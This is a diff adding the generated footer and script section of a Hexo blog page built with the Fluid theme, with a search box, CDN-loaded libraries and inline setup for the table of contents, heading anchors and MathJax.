+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/star.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Please enable JavaScript to render the matrix.</div>
+  </noscript>
+</body>
+</html>
